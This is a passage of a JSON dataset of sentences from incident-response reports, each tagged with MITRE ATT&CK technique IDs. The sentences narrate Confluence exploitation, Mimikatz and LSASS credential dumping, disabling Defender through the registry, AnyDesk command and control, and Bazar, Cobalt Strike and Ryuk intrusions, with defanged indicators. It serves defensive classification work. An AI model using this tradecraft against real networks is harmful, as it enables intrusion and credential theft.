    ]
  },
  {
    "type": "text",
    "text": "The Metasploit loader process then accessed several other processes that were already running, including tomcat9.exe, conhost.exe, mysqld.exe, java.exe, and finally svchost.exe, as evidenced by Sysmon event ID 10 logs.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The granted access for each event was 0x1f3fff, which indicates that full access was granted to the process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Near the end of the intrusion, the threat actor executed Defender Control, an executable they had previously downloaded to the Confluence server as “DC.exe”",
    "command": "",
    "labels": [
      "T1059.003",
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "This tool was used to stop Windows Defender Antivirus Service by setting the registry value to 1 at the following key:\nHKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Subsequently, they modified a key registry value to explicitly enable RDP connections by setting fDenyTSConnections to 0 :",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Just 30 seconds after the first Metasploit loader process started running, it created a remote thread in the Local Security Authority Subsystem (lsass.exe) process, detected in Sysmon event ID 8.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Once system privilege was obtained, AnyDesk was installed to obtain remote command and control.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Access to this user’s profile was used to drop additional tools into the Desktop folder and start the enumeration activity.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor used the AnyDesk session to drop mimikatz.exe (both 32-bit and 64-bit versions) and its associated drivers and library files on the Confluence server, as the SYSTEM user:\nmimikatz.exe\nmimidrv.sys\nmimilove.exe\nmimilib.dll",
    "command": "",
    "labels": [
      "T1003.001",
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Along with these files, a simple batch script named !start.cmd which detects the OS architecture and runs the appropriate version of Mimikatz with command line arguments was also dropped.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Just 30 seconds after dropping these files, the threat actor used the batch script to execute the 64-bit version with the following command line arguments:",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "The mimikatz.exe process accessed the Local Security Authority Subsystem Service (lsass.exe) to access credentials, and was granted access.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "The access granted flags 0x1010 translates to: PROCESS_QUERY_LIMITED_INFORMATION (0x1000), PROCESS_VM_READ (0x0010)",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "About 20 seconds after the 64-bit version of mimikatz.exe ran, the 32-bit version executed from the same folder, because the !start.cmd batch file runs both 64-bit and 32-bit versions when a 64-bit OS is detected.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Then, about 24 minutes later, the 64-bit version of mimikatz.exe was run again from a different user account (a local administrator), followed by the 32-bit version 20 seconds later.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "In all four executions of mimikatz, a Sysmon ProcessAccess event ID 10 was generated targeting lsass.exe with the granted access flags 0x1010.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Each time after running mimikatz, the threat actor used notepad.exe one or more times to view the contents of the “!logs\\Result.txt” file containing the credential hashes dumped by mimikatz.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Further activity potentially related to credential access involved ProcessHacker, which was installed and run on a backup server 12 minutes after Mimikatz execution, and again on a file server 15 minutes thereafter.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Sysmon logs (event ID 10) showed ProcessHacker.exe accessing lsass.exe as SYSTEM and being granted 0x1010 access on both occasions.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Although this level of access is typical for tools attempting to dump credentials from LSASS, we did not observe corresponding file creation events to confirm an LSASS dump via ProcessHacker.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Most likely, the NTLM hashes came from the output of Mimikatz.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Even if the executable file had not so obviously been named secretsdump.exe, threat hunting or writing detections for the unique command line arguments used by common post-exploitation tools can be a powerful technique to detect malicious activity.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Another artifact produced by secretsdump.exe was a file named starting with “sessionresume_” followed by random characters, and no file extension:",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Several discovery methods were observed in use throughout the attack chain to assist the threat actor in enumerating information about the environment.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Many of the discovery commands were issued as a direct result of the initial Confluence exploit, originating from the Tomcat process itself.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "These commands included running whoami, as well as directory listings of the host running the Confluence application:",
    "command": "",
    "labels": [
      "T1033",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Account Discovery Using DIR, WHOAMI, and NET",
    "command": "",
    "labels": [
      "T1033",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The initial exploit attempts from this IP appeared designed to run the whoami command, likely to ascertain the Tomcat web server’s privileges.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Interestingly, a typographical error was noted (“cmd.exe /c whaomi”), hinting at the possibility of manual input, though the direct attribution of this specific activity to the primary threat actor is uncertain.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "This was followed by several commands used to perform directory listings under the ‘c:\\Users\\’ path to identify valid account names:",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "There were two other exploits of Confluence to run “whoami” also on day two, from these two IP addresses: 185.228.19[.]244, and 185.220.101[.]185.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Because there were no follow-up commands from either of these IP addresses beyond the initial “whoami”, it is not possible to tell whether this activity was discovery related to the same threat actor or if it was random vulnerability scanning.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "On the third day of the intrusion – the threat actor dropped netscan in a users Desktop folder on the beachhead while connected to an interactive session via AnyDesk.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This process was repeated later in the same day by the threat actor once a ‘Domain Admin’ level account was acquired using a similar pattern (netscan being dropped to the desktop, same scanning profile and same targets).",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "In this particular case, the rpcdump.exe was automated with a batch script, combined to look for specific output (as indicated by the findstr /C:\"MS-RPRN\" /C:\"MS-PAR\" string) that could show if either of the two RPC endpoints is available on the target systems:",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor heavily used wmiexec to run commands remotely on a domain controller from the Confluence server initially exploited.",
    "command": "",
    "labels": [
      "T1047",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "All the commands on the domain controller were child processes of wmiprvse.exe.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "WMIEXEC",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Shortly after executing mimikatz and testing the credentials with secretsdump.exe, the threat actor dropped a secondary tool (wmiexec.exe) from the Explorer process (from AnyDesk copy/paste session capability which supports both file and text) – this is confirmed in the ad.trace file located in the user directory (c:\\users\\%USERNAME%\\AppData\\Roaming\\AnyDesk\\ad.trace).",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "For each tool/file transfer event initiated via the copy/paste functionality in AnyDesk, there are a set of corresponding logs that indicate a file transfer has been initiated from the threat actor’s machine to the victim machine:",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This corresponds with a sysmon ‘FileCreate’ event type for the creation of the wmiexec.exe tool:",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "After the threat actor obtained access to an account with domain administrator rights, the wmiexec.exe command was slightly altered to create an interactive command prompt on the remote domain controller:",
    "command": "",
    "labels": [
      "T1047",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "On the domain controller – this interactive command prompt was used to issue several commands, which included listing current user (whoami), and eventually adding a new user (NONAME) to the domain (and to several privileged groups):",
    "command": "",
    "labels": [
      "T1033",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "These wmiexec commands were observed on the remote side (domain controller) as a type of redirection command to the local admin share.",
    "command": "",
    "labels": [
      "T1047",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "For example, when running the ‘whoami’ command, the command was redirected to a local file created in the ADMIN$ directory:",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "There was a corresponding “FileCreate” event in the sysmon logs, which matched the redirect file name that was created (file name was the epoch timestamp for when the command was issued):",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "On the remote target side (domain controller) – several existing SIGMA rules detected this activity: proc_creation_win_wmiprvse_spawning_process.yml, proc_creation_win_cmd_redirect.yml, proc_creation_win_hktl_impacket_lateral_movement.yml, proc_creation_win_susp_redirect_local_admin_share.yml",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "From the beachhead – the threat actor uploaded a tool set that included several exploits as well as batch scripts to automate running these tools:",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This script created a local share (named ‘share’), set permissions to enable/ensure access, and rebooted the machine:",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Shortly after the execution of the batch script, the threat actor was observed restarting the system to ensure all the changes took effect:",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Additionally, several SIGMA rules tripped when the batch script was run that can be useful in detecting this activity: proc_creation_win_net_share_unmount.yml (deletion of existing share), proc_creation_win_susp_file_permission_modifications.yml (creation of share), proc_creation_win_net_start_service.yml (Starting LanManServer and LanManWorkstation)",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Remote Desktop Protocol",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "After the threat actor obtained a domain account with administrative privilege, they were observed using RDP to move laterally to a file server as well as a backup server.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Of note, in at least one instance, the threat actor used the discovery mapping conducted from the Netscan discovery tool to launch the RDP session.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "This can be observed on the beachhead side in process creation events – Security Event Logs (event ID 4688) or Sysmon Event Logs (event ID 1) – when netscan.exe is observed spawning a sub-process of mstsc when the threat actor clicked the “Remote Desktop” option and launched a RDP session with the backup server:",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "SIGMA rule to detect mstsc.exe being spawned by netscan.exe",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Metasploit was used to exploit the Confluence server and deliver a Meterpreter executable payload via curl, which was then immediately executed.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Each time, the executable payload was downloaded from IP address 91.191.209[.]46, and the Meterpreter payload connected to the same IP address on port 12385.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The consistent bytes are outlined in a red box and the byte that was different each time is outlined in a blue box.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The network communication with the Metasploit server triggered the following Suricata signature from the Emerging Threats ruleset (sid 2025644):",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The Command and Control traffic to the Metasploit server used raw TCP sockets, not HTTP or other common protocols.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The connections did not last very long, only about 13 minutes between Confluence exploitation and closing the Metasploit C2 connection, and the threat actor appeared to favor using Metasploit just to run an initial set of commands, and to deliver AnyDesk, then continued most of the intrusion activity over AnyDesk.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "AnyDesk software can be used with either Cloud servers, or “On-Prem” (self-hosted) servers.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor hosted their own On-Prem AnyDesk server at IP address 45.227.254[.]124 (port 443), which was the same IP address that exploited the Confluence vulnerability to run “whoami” 20 minutes before the Metasploit payload was delivered using the same vulnerability.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "However, scan results from fofa.info showed that less than one month after the intrusion activity, this host was presenting a self-signed certificate on port 3389 with certificate serial number 104770999709883145161872575332968665437 and common name “D-422”",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "During the intrusion, the threat actor utilized AnyDesk’s Direct Connection feature to establish a connection to a threat actor’s controlled server at IP address 45.227.254.124, bypassing AnyDesk’s relay servers.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This direct connection method suggests an attempt to evade detection by network security tools that might otherwise monitor traffic routed through AnyDesk’s central infrastructure.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Connecting directly to an external server under their control allows the threat actor to exfiltrate data or control the compromised system more discreetly.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "A total of just under 70 MB was exchanged in both directions between the threat actor’s AnyDesk server and the compromised network, including all remote desktop screen images, as well as the ransomware and other tools sent to the affected systems.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The ELPACO-team.exe file was a self-extracting 7-zip SFX file, which expanded the following files, all in the path “C:\\Users\\noname\\AppData\\Local\\Temp\\5\\7ZipSfx.000\\”.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The 7za.exe file then created the rest of the files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Then, it copied all the files listed above to the new folder, while also creating new files in that folder: svhostss.exe, Everything.ini, Everything2.ini, Everything64.dll, global_options.ini",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The svhostss.exe file hash matched the hash of the ELPACO-team.exe file that was extracted to the folder by 7za.exe, showing that it was just a renamed copy of the same file.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The Everything64.dll file was extracted using the password “7595128543001923103”",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "After extracting the files, the “svhostss.exe” file was executed as a child process of ELPACO-team.exe.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The svhostss.exe ransomware process accessed other processes over 12000 times in less than 10 minutes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Most of the process access events targeted lsass.exe (granted access 0x40) and svchost.exe (granted access 0x40 and 0x121411).",
    "command": "",
    "labels": [
      "T1003.001",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Analysis of command-line activity reveals the threat actor’s use of specific PowerShell cmdlets for discovering and interacting with virtual machines.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "followed by Get-VHD to identify associated virtual disk files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor then repeated this process on a key file server, including preliminary steps such as disabling security tools with DefenderControl and installing Process Hacker before running the ELPACO-team.exe payload.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "To cover their tracks, the threat actor performed some file deletions on the beachhead host before ceasing their activity.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "In an intrusion this past month we saw another link between the 3 families with a Bazar loader bringing in Anchor DNS to facilitate a full domain compromise intrusion.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The excel file failed to bring down the payload but to follow the infection chain we executed the follow on loader.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Once Bazar was established the malware quickly injected into the Werfault process to avoid detection.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "As seen in many intrusions the malware then performed some initial discovery with built-in Microsoft utilities such as Nltest.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "About an hour after initial execution, a Cobalt Strike beacon was loaded, followed shortly by Anchor.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Shortly after Cobalt Strike and Anchor were running, the attackers dumped credentials and began moving laterally, starting with a domain controller.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "A DocuSign themed Excel xls was opened and macros were enabled.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "New #BazarCall #BazarLoader campaigns.snutrition,net > snutrition,usobpharmacy,net > obpharmacy,usXLS https://t.co/rNLglHadGVEXE https://t.co/D28MoDqSLDIOCs: https://t.co/mc56wgU8EW pic.twitter.com/GiIlKY4tT0— TheAnalyst (@ffforward) February 8, 2021",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "New #BazarCall #BazarLoader campaigns.snutrition,net > snutrition,usobpharmacy,net > obpharmacy,usXLS https://t.co/rNLglHadGVEXE https://t.co/D28MoDqSLDIOCs: https://t.co/mc56wgU8EW pic.twitter.com/GiIlKY4tT0",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The macro in this maldoc is using Excel 4 Macros.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "After execution, Excel called out to: https://morrislibraryconsulting[.]com/favicam/gertnm.php",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "We then executed the follow on malware manually.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "About an hour after execution of the above Bazar Loader, Cobalt Strike was executed by the injected Werfault process.",
    "command": "",
    "labels": [
      "T1055",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Shortly after Cobalt Strike was executed, it dropped several Anchor executable files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "AnchorDns was then executed via Cobalt Strike which called cmd and then anchorAsjuster.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Bazar quickly moved into a Werfault process to handle command and control communication avoiding making any network connections directly.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Process injection was also seen in other key system executables such as winlogon.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Anchor was also seen triggering process tampering.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors were seen using remote thread creation to inject into lsass to extract credentials.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Systems were pinged from the domain controller to confirm connectivity.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Four days into the intrusion the threat actors dropped and executed Advanced_IP_Scanner_2.5.3850.exe which kicked off a scan of the network.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "AWS was used to get the public IP of the infected machine, multiple times.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Minutes before deployment of Ryuk the threat actors usually drop the following files, usually on a domain controller.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This time they dropped the files on a domain controller in C:\\info",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "checkip.amazonaws.com",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "start.bat was executed with the following:",
    "command": "",
    "labels": [
      "T1105",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The contents of Get-DataInfo.ps1 show a detailed information collector to provide the threat actor with very specific details of the environment.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "This includes things like disk size, connectivity,antivirus software, and backup software.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Two hours post initial access the threat actors began lateral movement to one of the domain controllers using PowerShell, which was executed via a remote service, which launched Cobalt Strike",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Reviewing the PowerShell script we can extract the shellcode and run it through scdbg to find the pipe used by the beacon.",
    "command": "",
    "labels": [
      "T1055",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors also used SMB beacons executed by remote services as well.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "We observed the Bazar malware inject into a WerFault process to perform ongoing command and control communication.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The deployment of the Get-DataInfo.ps1 script and overall TTP’s used in the intrustion are consistent with threat actors associated with deployments of the Ryuk ransomware family.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "In this case, we will describe how the threat actor went from a DocuSign themed, malicious document, to domain wide compromise, using Bazar aka KEGTAP and Cobalt Strike.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "This investigation began as many do, with a malicious document delivered via email.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The email and accompanying Excel file purported to be a DocuSign request, which entices the user to enable macros.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "This lead to Bazar being dropped on the system, which created a run key for persistence.",
    "command": "",
    "labels": [
      "T1105",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The malware also executed some basic nltest domain discovery, and a short ping to a Cobalt Strike server, but no additional activity was observed.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "On the fourth day, Bazar pulled down a Cobalt Strike Beacon in the form of a DLL, which was executed via rundll32 and injected into various system processes.",
    "command": "",
    "labels": [
      "T1055",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "One of those processes injected into, was dllhost, which then ran various PowerSploit commands for discovery activity and dumped credentials from lsass.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Shortly thereafter, the threat actors began moving laterally using multiple techniques, such as:Pass the Hash、SMB executable transfer and exec、RDP、Remote service execution.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors then continued pivoting and collecting more information about the environment.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "On that domain controller, they executed AdFind, and then dropped a custom PowerShell script named Get-DataInfo.ps1.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This script looks for all active machines and queries installed software, i.e., backup software, security software, etc.",
    "command": "",
    "labels": [
      "T1016",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Initial access to the environment was via a malicious email that entices a user to download an Excel document with macros using a DocuSign social engineering theme.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The Excel document required the user to enable content to execute.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The embedded macro in the file was using an Excel 4.0 macro, which at time of execution had a detection rate of 1/63 in Virustotal.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Upon execution of the macro the file reached out to: https://juiceandfilm[.]com/salman/qqum.php",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "From there a file was written: C:\\Users\\USER\\Downloads\\ResizeFormToFit.exe",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "From here the executable then proceeds to create a new file and execute it via cmd.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Four days post initial access, a Cobalt Strike Beacon was executed via rundll32 and cmd.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Immediately following the execution of M1E1626.exe, a persistence mechanism was created for the file using a run key.",
    "command": "",
    "labels": [
      "T1105",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "This file was found to be a BazarBackdoor sample.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "After loading the Cobalt Strike DLL, there was an almost instant injection by the process into the Werfault process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "We also see the Cobalt Strike Beacon running in the dllhost.exe process, loading PowerShell to perform PowerSploit commands in the discovery section.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Additionally via the use of YARA inspection we found Cobalt Strike running or injected into processes across the environment.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Lsass was dumped using Cobalt Strike on multiple occasions.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "After beginning lateral movement, the threat actors used the following Window’s utilities for system profiling:",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Finally, the following collection of files were dropped on the domain controller:",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This includes things like disk size, connectivity, antivirus software, and backup software.",
    "command": "",
    "labels": [
      "T1016",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "This script and files are available @ https://thedfirreport.com/services/",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The first observed method was the use of a remote service using PowerShell which injected into winlogon.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors also leveraged SMB to send Cobalt Strike Beacon executables to $ADMIN shares and again execute them on the remote systems via a service.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "RDP was also leveraged by the attacker via their Cobalt Strike Beacons.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors used BazarCall to install Trickbot in the environment which downloaded and executed a Cobalt Strike Beacon.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "From there the threat actor discovered the internal network before moving laterally to a domain controller for additional discovery.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The Trickbot payload came from a phishing campaign associated with BazarCall, delivering weaponized XLSB files.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Upon execution, certutil.exe was copied to %programdata% and renamed with random alphanumeric characters.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Certutil was used to download and load the Trickbot DLL into memory.",
    "command": "",
    "labels": [
      "T1055",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Trickbot was automatically tasked to inject into the wermgr.exe process and use its well-known “pwgrab” module to steal browser credentials.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "As part of further automated tasking, Trickbot performed an initial reconnaissance of the environment using native Windows tools such as nltest.exe and net.exe.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "First hands-on activity was observed two hours after initial compromise, when Trickbot downloaded and executed Cobalt Strike Beacons.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Once access through Cobalt Strike was established, the threat actors immediately proceeded with domain enumeration via Nltest, AdFind, BloodHound, and PowerSploit.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "One example being with a Beacon unsuccessfully injecting into a process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Ten minutes after lateral movement, a PowerShell Cobalt Strike loader executed as a service on a server.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Windows Defender real-time monitoring was then disabled, the LSASS.exe process was dumped using SysInternals ProcDump, and privilege was escalated to “SYSTEM” using named pipe impersonation.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1562.001"
    ]
  },
  {
    "type": "text",
